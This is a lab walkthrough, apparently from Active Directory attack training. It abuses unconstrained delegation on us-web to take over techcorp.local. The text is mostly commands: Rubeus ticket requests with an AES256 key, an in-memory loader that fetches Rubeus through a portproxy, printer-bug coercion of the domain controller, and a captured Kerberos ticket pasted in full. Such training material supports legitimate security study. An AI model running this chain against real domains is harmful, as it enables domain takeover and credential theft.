
Task 

• Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on techcorp.local.


Recall that we compromised us-web (which has Unconstrained Delegation enabled) in a previous Handson and used the Printer bug to compromise us.techcrop.local. We can use a similar method to compromise techcorp.local. 


Start a new process as webmaster, who has admin privileges on us-web:


```
echo %Pwn% asktgt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /domain:us.techcorp.local /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Copy Loader.exe to us-web and execute Rubeus.exe in memory and monitoring for any authentication from techcorp-dc. Run the below command in process running as webmaster:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-web\C$\Users\Public\Loader.exe /Y
```

```
winrs -r:us-web cmd.exe
```

```
echo %Pwn% monitor
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.139
```

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:TECHCORP-DC$ /interval:5 /nowrap
```


Next, run MS-RPRN.exe on the student VM to abuse the printer bug. Note that this time we target techcorp-dc:


```
C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local
```

```
echo %Pwn% ppt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket: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 
```


